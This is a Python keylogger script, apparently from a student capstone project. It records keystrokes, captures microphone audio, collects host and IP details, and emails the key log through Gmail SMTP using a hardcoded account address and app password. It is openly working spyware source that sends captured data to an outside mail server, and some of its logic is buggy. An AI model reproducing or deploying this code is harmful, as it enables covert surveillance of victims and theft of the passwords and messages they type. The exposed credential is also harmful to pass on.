
# Libraries

#for keystocks
from pynput.keyboard import Key, Listener
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


# Default Module used to collect the computer's Information

import socket
import platform



import getpass
from requests import get

# Importing Libraries for Microphone
import sounddevice as sd
from scipy.io.wavfile import write




# Create Key Log TXT
keys_information = "key_log.txt"
system_information = "get_system_information.txt"

file_path = "D:\\sem 4\\capstone\\keylogger\\Project"
extend = "\\"


smtp_port = 587
smtp_server = "smtp.gmail.com"
keys_information = "key_log.txt"


audio_information = "audio.wav"
microphone_time = 10


email_from = "conestogakeylogger@gmail.com"
pswd = "efelgipnrwlzhhtn"

subject = "New Email from group 6"
email_list = ["conestogakeylogger@gmail.com", "conestogakeylogger@gmail.com", "conestogakeylogger@gmail.com"]







# Create Microphone

def microphone(file_path, extend, audio_information, microphone_time):
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

# To start recording, call the microphone function with the desired parameters
microphone(file_path, extend, audio_information, microphone_time)










count = 0
keys = []


def send_email(email_list):
    global body, person
    for person in email_list:
        body = "new email"

    # make a mime object to define part of the email

    msg = MIMEMultipart()
    msg["From"] = email_from
    msg["To"] = person
    msg["Subject"] = subject

    # attach the body of the msg
    msg.attach(MIMEText(body, 'plain'))

    filename = "key_log.txt"

    attachment = open(filename, 'rb')

    # Encode as base 64
    attachment_package = MIMEBase('application', 'octet-stream')
    attachment_package.set_payload((attachment).read())
    encoders.encode_base64(attachment_package)
    attachment_package.add_header('Content-Disposition', "attachment; filename= " + filename)
    msg.attach(attachment_package)

    # Cast as string
    text = msg.as_string()

    # Connect with the server
    print("Connecting to server...")
    TIE_server = smtplib.SMTP(smtp_server, smtp_port)
    TIE_server.starttls()
    TIE_server.login(email_from, pswd)
    print("Succesfully connected to server")
    print()

    # Send emails to "person" as list is iterated
    print(f"Sending email to: {person}...")
    TIE_server.sendmail(email_from, person, text)
    print(f"Email sent to: {person}")
    print()

# Close the port
    TIE_server.quit()

send_email(email_list)



# When we press Ke y
def on_press(key):
    global keys, count

#append key by adding count 1
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


# Here We append the Key data in One File

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")

            if k == 'Key.space':
                f.write('\n')
            elif k == 'Key.enter':
                f.write('\n')
            elif k == 'Key.backspace':
                # Handle backspace as needed
                pass
            elif 'Key.shift' in k:
                # Handle shift key press
                pass
            else:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()











#computer information start

def computer_information():
    with open(file_path + extend +system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipfy.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address")

            f.write("Processor: " + (platform.processor()) + '\n')
            f.write("System Information: " + platform.system() + " " + platform.version() + '\n')
            f.write("Machine: " + platform.machine() + '\n')
            f.write("Hostname: " + hostname + '\n')
            f.write("Private IP Address: " + IPAddr + '\n')


computer_information()

